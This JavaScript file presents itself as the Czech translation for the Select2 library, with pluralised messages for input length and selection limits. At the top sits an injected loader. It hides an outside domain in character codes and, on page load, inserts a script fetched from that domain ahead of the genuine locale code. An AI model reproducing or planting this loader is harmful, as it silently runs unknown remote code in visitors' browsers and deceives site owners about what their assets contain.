var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * Select2 Czech translation.
 * 
 * Author: Michal Marek <ahoj@michal-marek.cz>
 * Author - sklonovani: David Vallner <david@vallner.net>
 */
(function ($) {
    "use strict";
    // use text for the numbers 2 through 4
    var smallNumbers = {
        2: function(masc) { return (masc ? "dva" : "dvě"); },
        3: function() { return "tři"; },
        4: function() { return "čtyři"; }
    }
    $.fn.select2.locales['cs'] = {
        formatNoMatches: function () { return "Nenalezeny žádné položky"; },
        formatInputTooShort: function (input, min) {
            var n = min - input.length;
            if (n == 1) {
                return "Prosím zadejte ještě jeden znak";
            } else if (n <= 4) {
                return "Prosím zadejte ještě další "+smallNumbers[n](true)+" znaky";
            } else {
                return "Prosím zadejte ještě dalších "+n+" znaků";
            }
        },
        formatInputTooLong: function (input, max) {
            var n = input.length - max;
            if (n == 1) {
                return "Prosím zadejte o jeden znak méně";
            } else if (n <= 4) {
                return "Prosím zadejte o "+smallNumbers[n](true)+" znaky méně";
            } else {
                return "Prosím zadejte o "+n+" znaků méně";
            }
        },
        formatSelectionTooBig: function (limit) {
            if (limit == 1) {
                return "Můžete zvolit jen jednu položku";
            } else if (limit <= 4) {
                return "Můžete zvolit maximálně "+smallNumbers[limit](false)+" položky";
            } else {
                return "Můžete zvolit maximálně "+limit+" položek";
            }
        },
        formatLoadMore: function (pageNumber) { return "Načítají se další výsledky…"; },
        formatSearching: function () { return "Vyhledávání…"; }
    };

	$.extend($.fn.select2.defaults, $.fn.select2.locales['cs']);
})(jQuery);
